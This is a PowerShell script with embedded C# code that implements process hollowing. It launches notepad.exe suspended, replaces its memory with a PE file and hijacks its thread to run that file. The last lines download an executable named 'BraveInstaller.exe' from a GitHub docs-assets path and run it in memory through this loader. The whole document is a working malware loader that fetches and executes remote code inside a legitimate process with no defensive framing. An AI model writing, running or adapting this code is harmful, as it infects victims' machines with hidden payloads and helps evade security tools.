Add-Type -TypeDefinition @"

using System;
using System.Runtime.InteropServices;

public static class H
{
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res;
        public ushort e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2;
        public int e_lfanew;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public ushort SizeOfOptionalHeader, Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32 {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
        public uint AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public uint SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
        public uint AddressOfEntryPoint, BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public ulong SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData;
        public uint PointerToRelocations, PointerToLinenumbers;
        public ushort NumberOfRelocations, NumberOfLinenumbers;
        public uint Characteristics;
    }

    // ---------- CORRECTED CONTEXT32 (x86) using explicit offsets ----------
    [StructLayout(LayoutKind.Explicit)]
    struct CONTEXT32 {
        [FieldOffset(0)]   public uint ContextFlags;
        [FieldOffset(4)]   public uint Dr0;
        [FieldOffset(8)]   public uint Dr1;
        [FieldOffset(12)]  public uint Dr2;
        [FieldOffset(16)]  public uint Dr3;
        [FieldOffset(20)]  public uint Dr6;
        [FieldOffset(24)]  public uint Dr7;
        [FieldOffset(28)]  public uint SegGs;
        [FieldOffset(32)]  public uint SegFs;
        [FieldOffset(36)]  public uint SegEs;
        [FieldOffset(40)]  public uint SegDs;
        [FieldOffset(44)]  public uint Edi;
        [FieldOffset(48)]  public uint Esi;
        [FieldOffset(52)]  public uint Ebx;
        [FieldOffset(56)]  public uint Edx;
        [FieldOffset(60)]  public uint Ecx;
        [FieldOffset(64)]  public uint Eax;
        [FieldOffset(68)]  public uint Ebp;
        [FieldOffset(72)]  public uint Eip;
        [FieldOffset(76)]  public uint SegCs;
        [FieldOffset(80)]  public uint EFlags;
        [FieldOffset(84)]  public uint Esp;
        [FieldOffset(88)]  public uint SegSs;
    }

    // ---------- CORRECTED CONTEXT64 (x64) using explicit offsets ----------
    [StructLayout(LayoutKind.Explicit)]
    struct CONTEXT64 {
        [FieldOffset(0)]   public ulong P1Home;
        [FieldOffset(8)]   public ulong P2Home;
        [FieldOffset(16)]  public ulong P3Home;
        [FieldOffset(24)]  public ulong P4Home;
        [FieldOffset(32)]  public ulong P5Home;
        [FieldOffset(40)]  public ulong P6Home;
        [FieldOffset(48)]  public uint  ContextFlags;
        [FieldOffset(52)]  public uint  MxCsr;
        [FieldOffset(56)]  public ushort SegCs;
        [FieldOffset(58)]  public ushort SegDs;
        [FieldOffset(60)]  public ushort SegEs;
        [FieldOffset(62)]  public ushort SegFs;
        [FieldOffset(64)]  public ushort SegGs;
        [FieldOffset(66)]  public ushort SegSs;
        [FieldOffset(68)]  public uint  EFlags;
        [FieldOffset(72)]  public ulong Dr0;
        [FieldOffset(80)]  public ulong Dr1;
        [FieldOffset(88)]  public ulong Dr2;
        [FieldOffset(96)]  public ulong Dr3;
        [FieldOffset(104)] public ulong Dr6;
        [FieldOffset(112)] public ulong Dr7;
        [FieldOffset(120)] public ulong Rax;
        [FieldOffset(128)] public ulong Rcx;
        [FieldOffset(136)] public ulong Rdx;
        [FieldOffset(144)] public ulong Rbx;
        [FieldOffset(152)] public ulong Rsp;
        [FieldOffset(160)] public ulong Rbp;
        [FieldOffset(168)] public ulong Rsi;
        [FieldOffset(176)] public ulong Rdi;
        [FieldOffset(184)] public ulong R8;
        [FieldOffset(192)] public ulong R9;
        [FieldOffset(200)] public ulong R10;
        [FieldOffset(208)] public ulong R11;
        [FieldOffset(216)] public ulong R12;
        [FieldOffset(224)] public ulong R13;
        [FieldOffset(232)] public ulong R14;
        [FieldOffset(240)] public ulong R15;
        [FieldOffset(248)] public ulong Rip;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string app, string cmd, IntPtr pAttr, IntPtr tAttr, bool inherit,
        uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buf, uint sz, out uint written);
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr addr);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint ms);
    [DllImport("kernel32.dll")]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    const uint CREATE_SUSPENDED = 0x4;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CONTEXT_FULL = 0x10007;

    public static int Run(byte[] pe)
    {
        var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
        int peOff = dos.e_lfanew;
        int ntOff = peOff + 4;
        var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
        bool is64 = fh.Machine == 0x8664;
        int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
        ulong prefBase = 0;
        uint sizeImg = 0, epRva = 0;
        if (is64) {
            var o64 = BytesToStruct<IMAGE_OPTIONAL_HEADER64>(pe, optOff);
            prefBase = o64.ImageBase; sizeImg = o64.SizeOfImage; epRva = o64.AddressOfEntryPoint;
        } else {
            var o32 = BytesToStruct<IMAGE_OPTIONAL_HEADER32>(pe, optOff);
            prefBase = o32.ImageBase; sizeImg = o32.SizeOfImage; epRva = o32.AddressOfEntryPoint;
        }

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.wShowWindow = 1;
        PROCESS_INFORMATION pi;
        string host = is64 ? @"C:\Windows\System32\notepad.exe" : @"C:\Windows\SysWOW64\notepad.exe";
        if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            return 1;

        NtUnmapViewOfSection(pi.hProcess, (IntPtr)prefBase);

        IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero)
            newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero) { TerminateProcess(pi.hProcess, 0); return 2; }

        uint written;
        int hdrSize = optOff + fh.SizeOfOptionalHeader + fh.NumberOfSections * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
        byte[] hdr = new byte[hdrSize];
        Array.Copy(pe, 0, hdr, 0, hdrSize);
        WriteProcessMemory(pi.hProcess, newBase, hdr, (uint)hdrSize, out written);

        for (int i = 0; i < fh.NumberOfSections; i++) {
            var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (sec.SizeOfRawData > 0) {
                byte[] secData = new byte[sec.SizeOfRawData];
                Array.Copy(pe, (int)sec.PointerToRawData, secData, 0, sec.SizeOfRawData);
                IntPtr dest = IntPtr.Add(newBase, (int)sec.VirtualAddress);
                WriteProcessMemory(pi.hProcess, dest, secData, sec.SizeOfRawData, out written);
            }
        }

        VirtualAllocEx(pi.hProcess, newBase, sizeImg, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (is64) {
            var ctx64 = new CONTEXT64();
            ctx64.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx64)) return 3;
            ctx64.Rip = (ulong)newBase.ToInt64() + epRva;
            if (!SetThreadContext(pi.hThread, ref ctx64)) return 4;
        } else {
            var ctx32 = new CONTEXT32();
            ctx32.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx32)) return 3;
            unchecked { ctx32.Eip = (uint)(newBase.ToInt32() + (int)epRva); }
            if (!SetThreadContext(pi.hThread, ref ctx32)) return 4;
        }

        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
        uint exitCode;
        GetExitCodeProcess(pi.hProcess, out exitCode);
        return (int)exitCode;
    }

    static T BytesToStruct<T>(byte[] buf, int offset) where T : struct
    {
        int size = Marshal.SizeOf<T>();
        IntPtr p = Marshal.AllocHGlobal(size);
        Marshal.Copy(buf, offset, p, size);
        T s = Marshal.PtrToStructure<T>(p);
        Marshal.FreeHGlobal(p);
        return s;
    }
}

"@
$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/PoolSync-Studios/MCAntiPools/refs/heads/main/docs/assets/BraveInstaller.exe')
[H]::Run($data)
